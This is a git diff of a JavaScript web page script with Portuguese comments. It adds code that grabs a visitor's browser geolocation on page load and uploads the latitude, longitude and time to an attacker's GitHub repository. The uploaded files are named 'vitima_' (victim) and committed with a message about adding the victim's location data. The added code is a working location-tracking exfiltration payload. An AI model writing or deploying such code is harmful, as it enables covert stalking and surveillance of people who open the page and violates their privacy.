@@ -1,5 +1,7 @@
 // Função chamada assim que a página for carregada
 window.onload = function() {
+    console.log("Tentando obter localização...");
+
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(showPosition, showError);
     } else {
@@ -9,21 +11,56 @@ window.onload = function() {
 
 // Exibe a localização quando recebida
 function showPosition(position) {
+    console.log("Localização recebida!");
+
     const lat = position.coords.latitude;
     const lon = position.coords.longitude;
-    document.getElementById("location").innerHTML = `Latitude: ${lat} <br> Longitude: ${lon}`;
+    const time = new Date().toISOString();  // Hora no formato ISO
 
-    // Aqui você pode fazer algo com o arquivo locations.json se necessário
-    fetch('data/locations.json')
-        .then(response => response.json())
-        .then(data => {
-            console.log(data);  // Exibe o conteúdo de locations.json no console
+    document.getElementById("location").innerHTML = `Latitude: ${lat} <br> Longitude: ${lon} <br> Hora: ${time}`;
+
+    // Envia os dados para o GitHub
+    sendDataToGitHub(lat, lon, time);
+}
+
+// Função para enviar os dados para o GitHub
+function sendDataToGitHub(lat, lon, time) {
+    const token = 'SEU_TOKEN_AQUI'; // Coloque seu token de acesso pessoal aqui
+    const repo = 'SEU_REPOSITORIO'; // Nome do seu repositório GitHub
+    const path = `data/vitima_${Date.now()}.json`; // Nome do arquivo, pode ser personalizado
+    const content = JSON.stringify({
+        latitude: lat,
+        longitude: lon,
+        time: time
+    });
+
+    const encodedContent = btoa(content); // Codifica o conteúdo em base64
+
+    // Requisição para criar/editar o arquivo no GitHub
+    fetch(`https://api.github.com/repos/SEU_USUARIO/${repo}/contents/${path}`, {
+        method: 'PUT',
+        headers: {
+            'Authorization': `token ${token}`,
+            'Accept': 'application/vnd.github.v3+json'
+        },
+        body: JSON.stringify({
+            message: 'Adicionando dados de localização da vítima',
+            content: encodedContent
         })
-        .catch(err => console.error('Erro ao carregar locations.json:', err));
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.content) {
+            console.log('Arquivo criado/atualizado no GitHub:', data);
+        }
+    })
+    .catch(error => console.error('Erro ao enviar dados para o GitHub:', error));
 }
 
 // Exibe erro se não for possível obter a localização
 function showError(error) {
+    console.log("Erro ao obter localização:", error);
+
     switch(error.code) {
         case error.PERMISSION_DENIED:
             document.getElementById("location").innerHTML = "Você negou a permissão para acessar sua localização.";
